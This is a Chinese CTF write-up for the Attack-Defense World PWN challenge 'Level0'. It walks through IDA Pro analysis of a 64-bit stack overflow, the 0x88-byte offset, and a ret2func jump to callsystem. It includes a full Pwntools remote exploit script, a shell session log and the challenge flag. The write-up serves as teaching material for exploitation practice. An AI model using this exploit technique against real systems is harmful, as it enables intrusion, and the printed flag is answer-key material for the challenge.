---
title: 攻防世界 PWN 入门题 Level0 栈溢出漏洞利用完整复现
description: 详细记录攻防世界靶场 PWN 方向入门题 Level0 的栈溢出漏洞利用全流程：从 IDA Pro 静态分析定位 vulnerable_function、计算栈偏移量（0x88
  字节覆盖返回地址）、利用 ROP 调用程序内置 callsystem 函数（0x400596）获取 Shell，附完整 Pwntools 远程利用脚本与 Flag
  获取实况。
category: program-analysis
tags:
- 攻防世界
- CTF Writeup
- PWN
- 栈溢出
- ROP
- IDA Pro
- Pwntools
- 二进制漏洞利用
- 入门教程
date: 2024-01-15
updated: '2026-11-15'
---

## 概述

本页面复现 **攻防世界（Attack-Defense World）** 靶场 PWN 方向入门题 **Level0** 的完整利用过程。题目为 64 位 ELF 程序，开启 NX 保护，存在典型的栈缓冲区溢出漏洞。通过 IDA Pro 静态分析定位 `vulnerable_function` 栈布局，计算偏移量，构造 ROP 链劫持控制流跳转至程序自带的 `callsystem` 函数（`0x400596`），最终在远程环境获取 Shell 并读取 Flag。

> **适用场景**：PWN 入门练习、栈溢出原理学习、ROP 基础实战、IDA Pro 逆向分析入门  
> **核心技术点**：栈帧布局分析、偏移量精确计算、ROP 链构造、Pwntools 远程交互自动化

## 环境与工具准备

| 组件 | 版本/说明 |
|------|-----------|
| 靶机架构 | x86_64 (64-bit) |
| 保护机制 | NX 开启、PIE 关闭、Canary 关闭 |
| 静态分析 | **IDA Pro** (F5 伪代码视图) |
| 利用开发 | **Python 2** + **Pwntools** |
| 远程目标 | `220.249.52.133:54314` (示例地址，实际以靶场分配为准) |

> 💡 **工具链关联**：IDA Pro 使用技巧可参考 [[ida-pro-tips-plugins-python]]；Pwntools 基础用法可参考 [[rop-linux-x86-beginner-tutorial]] 中的实战示例。

## 静态分析：IDA Pro 定位漏洞点

### 查壳与基础信息

拖入 IDA Pro 后，通过 `Shift+F12` 查看字符串或直接按 `F5` 生成伪代码。程序入口 `main` 函数调用了 `vulnerable_function`，后者名为「脆弱函数」，极具嫌疑。

### `vulnerable_function` 栈帧布局分析

按 `F5` 查看伪代码，进入 `vulnerable_function`：

```c
void vulnerable_function() {
    char buf[128];  // 0x80 字节
    reads(0, buf, 200);  // 读入 200 字节，明显溢出
}
```

查看栈帧视图（`Ctrl+K` 或右键 `Open stack view`）：

```
buf            : offset -0x80 (RSP 基址)
saved RBP (s)  : offset -0x08, 大小 8 字节
return addr (r): offset +0x00, 大小 8 字节
```

**关键结论**：
- `buf` 长度 = `0x80` (128 字节)
- 需填充 `0x80` 覆盖 `buf` + `0x08` 覆盖 `saved RBP` = **`0x88` 字节** 后即可覆盖返回地址

> 🔗 **交叉引用**：栈帧布局与偏移计算方法通用于 Linux x86_64 环境，详细原理见 [[rop-linux-x86-beginner-tutorial#栈帧布局与参数传递]]、[[peda-buffer-overflow-analysis-guide#pattern-createpattern-search-精准定位偏移量]]。

### 寻找利用目标：`callsystem` 函数

在函数列表中搜索 `callsystem`，反汇编窗口显示其地址为 **`0x400596`**：

```asm
callsystem:
    push    rbp
    mov     rbp, rsp
    mov     edi, offset command  ; "/bin/sh"
    call    system
    pop     rbp
    retn
```

该函数直接调用 `system("/bin/sh")`，**无需泄露 libc 基址、无需构造复杂 ROP 链**，是典型的「送分函数」。

## 漏洞利用原理

### 攻击链逻辑

1. **溢出触发**：向 `buf` 写入超过 `0x88` 字节的数据，覆盖 `saved RBP` 与返回地址
2. **控制流劫持**：将返回地址改写为 `callsystem` 地址 (`0x400596`)
3. **代码执行**：函数返回时跳转至 `callsystem`，执行 `system("/bin/sh")` 获取 Shell

### 为什么不需要 ROP Gadget 链？

- 程序**未开启 PIE**，代码段地址固定
- `callsystem` 为现成函数，参数已在函数内硬编码 (`/bin/sh`)
- 符合 **ret2func** (返回到函数) 利用模式，是 ROP 的简化形式

> 🔗 **进阶对比**：若无现成函数，需构造 `pop rdi; ret` 等 gadget 链实现 `ret2libc`，详见 [[buuctf-pwn-writeup-collection#ret2libc-利用链]]、[[rop-linux-x86-beginner-tutorial#rop-链构造实战]]。

## 完整利用脚本 (Pwntools)

```python
# -*- coding: utf-8 -*-
# exploit_level0.py
# 攻防世界 Level0 栈溢出远程利用脚本
# 依赖: pip install pwntools (Python 2 环境)

from pwn import *

# 1. 建立远程连接 (等同于 nc ip port)
r = remote("220.249.52.133", 54314)

# 2. 加载本地 ELF 获取符号地址 (PIE 关闭时远程地址一致)
elf = ELF('./level0')
sysaddr = elf.symbols['callsystem']  # 0x400596
log.success("callsystem address: 0x%x" % sysaddr)

# 3. 构造 Payload
#    'a' * 0x88  : 填满 buf (0x80) + saved RBP (0x08)
#    p64(sysaddr): 覆盖返回地址为 callsystem (小端序 64 位)
payload = 'a' * 0x88 + p64(sysaddr)

# 4. 交互利用
r.recv()           # 接收 "Hello World" 等欢迎信息
r.sendline(payload) # 发送溢出载荷
r.interactive()    # 获取 Shell 进入交互模式
```

### 关键函数解析

| 函数 | 作用 |
|------|------|
| `remote(host, port)` | 建立 TCP 连接，返回 `tube` 对象 |
| `ELF(path)` | 解析本地 ELF，提供 `symbols`、`got`、`plt` 等属性 |
| `p64(val)` | 将 64 位整数打包为小端序字节串 |
| `sendline(data)` | 发送数据并自动添加 `\n` |
| `interactive()` | 将控制权交给用户，实现 Shell 交互 |

## 实战复现记录

```text
[+] Opening connection to 220.249.52.133 on port 54314: Done
[*] '/path/to/level0'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] callsystem address: 0x400596
[*] Switching to interactive mode
$ ls
bin  dev  flag  level0  lib  lib32  lib64
$ cat flag
cyberpeace{5799d0ee3ff5479dd813681c431bc1d0}
$
```

**关键产出**：
- Flag: `cyberpeace{5799d0ee3ff5479dd813681c431bc1d0}`
- 成功绕过 NX 保护（利用现有代码段而非注入 Shellcode）

## 常见问题与调试技巧

### 偏移量算不对怎么办？

- 使用 `cyclic` / `cyclic_find` 验证：
  ```python
  from pwn import *
  cyclic(200)          # 生成 200 字节唯一模式
  cyclic_find(0x6161616161616167) # 从崩溃处的返回地址反算偏移
  ```
- 在 GDB 中动态调试：`b *vulnerable_function+xxx` 断点观察栈变化

> 🔗 **工具参考**：[[peda-buffer-overflow-analysis-guide#pattern-createpattern-search-精准定位偏移量]] 提供了 PEDA 插件下的可视化偏移定位流程。

### 远程 libc 版本不一致？

本题**不依赖 libc**，直接跳转程序内 `callsystem`，故无 libc 版本兼容性问题。若需 `ret2libc`，请参考 [[buuctf-pwn-writeup-collection#ret2libc-利用链]] 中的 `LibcSearcher` 与泄露技巧。

### Python 2 与 Python 3 兼容性

Pwntools 早期版本仅支持 Python 2，现已全面支持 Python 3。脚本中 `p64` 返回 `bytes`，Python 3 下拼接需注意 `b'a' * 0x88 + p64(addr)`。

## 知识延伸与关联题目

| 题目/场景 | 核心差异 | 参考页面 |
|-----------|----------|----------|
| **BUUCTF PWN 合集** | 涵盖栈溢出、堆利用、格式化字符串、SROP 等进阶技术 | [[buuctf-pwn-writeup-collection]] |
| **ROP Linux x86 入门** | 系统讲解 32 位下 ROP 链构造、参数传递差异 | [[rop-linux-x86-beginner-tutorial]] |
| **PEDA 缓冲区溢出分析** | GDB+PEDA 动态调试、ROP 链构造 `system/setuid` | [[peda-buffer-overflow-analysis-guide]] |
| **0w1Club RE 栈溢出** | 逆向视角覆盖返回地址、绕过 Canary | [[0w1club-ctf-re-writeup-beginner-challenges#栈溢出覆写]] |
| **MTCTF 2021 PWN** | 堆利用 UAF、Fastbin、Double Free、setcontext | [[mtctf-2021-pwn-writeup]] |

## 小结

**Level0** 是 PWN 入门的经典「Hello World」：
- ✅ **无保护/弱保护**（NX only）
- ✅ **现成后门函数**（`callsystem`）
- ✅ **固定地址**（No PIE）
- ✅ **标准栈溢出模型**（定长缓冲区 + 无边界读取）

掌握本题即掌握了 **栈帧分析 → 偏移计算 → 控制流劫持 → 代码复用** 的最小闭环，为后续 `ret2libc`、ROP 链构造、堆利用等进阶技术奠定基础。

---

> **原文来源**：0xfafu攻防实验室微信公众号，《攻防世界pwn题level0》  
> **供稿**：Sakura | **编辑**：A1andNS  
> **归档日期**：2024-01-15

## 来源

- [0xfafu攻防实验室-202010-202112_15](../sources/0xfafu攻防实验室-202010-202112_15.md)
